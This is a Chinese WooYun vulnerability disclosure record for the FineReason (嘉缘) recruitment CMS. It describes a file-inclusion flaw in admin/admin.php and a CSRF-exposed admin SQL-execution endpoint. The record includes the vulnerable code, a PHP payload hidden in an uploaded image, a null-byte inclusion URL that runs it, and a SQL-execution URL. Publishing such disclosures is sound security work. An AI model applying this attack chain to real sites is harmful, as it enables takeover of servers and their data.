{"id": 33734, "wybug_id": "wooyun-2015-0108141", "wybug_title": "嘉缘人才系统后台文件包含&amp;Csrf执行任意sql语句(可getshell)", "wybug_corp": "finereason.com", "wybug_author": "浅蓝", "wybug_date": "2015-04-21 18:59", "wybug_open_date": "2015-07-25 19:00", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-26：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-25：\t细节向公众公开  简要描述： 宁夏刚刚地震了。。。 而我正在提交漏洞。。。 我tm是在拿生命提交漏洞啊。。。。地震的同时我还在写过程 脑子一抽 手一哆嗦..误删了。。。强烈要求添加一个撤销操作功能 详细说明：  首先看 admin/admin.php 最后部分的代码\n}else{    $mod=$_GET['m'];$act=$_GET['a'];    aPurview($mod,$act);//检测管员权限    if(file_exists(ADMIN_ROOT.'inc/'.$mod.'.inc.php')){        require_once ADMIN_ROOT.'inc/'.$mod.'.inc.php';        //$actmod=new $mod();//        if($act&&method_exists($actmod,$act)){//            $actmod->$act();//        }else{//            $actmod->index();//        }    }    $smarty->assign('menulist',ashowmenu());    $smarty->display('index.htm');}\n如果ADMIN_ROOT.'inc/'.$mod.'.inc.php存在则包含此文件。$mod可控。 直接截断即可\n\n包含robots.txt文件接着 我注册一个账号  去上传图片图片代码为\n<?php file_put_contents(\"x.php\",\"xxxxxxxxxxxxx\");?>\n这是路径/upfiles/company/file/20150415/20150415142756_455.jpg构造如下URLhttp://localhost/frcms_v3.2_GBK/uploads/admin/admin.php?m=../../upfiles/company/file/20150415/20150415142756_455.jpg%00然后找个提交的地方 嵌入一个远程URL为以上URL 等待管理审核即可。。 我这直接在后台提交。。。\n\n\n\n\nhttp://localhost/frcms_v3.2_GBK/uploads/admin/admin.php?m=websys_execsql&a=doexecsqlsql=select user()&submit=+Ö´+ÐÐ+\n无token  未验证refererpoc我也不填了。。都因为刚才手抖给删了。。说多了都是泪。   漏洞证明：  如上   修复方案：  求通过。。求不忽略。。。求高rank。。。我可是在拿生命给你们提交漏洞啊。。。   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-25 19:00 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-21 19:11 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  强烈要求添加一个撤销操作功能    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}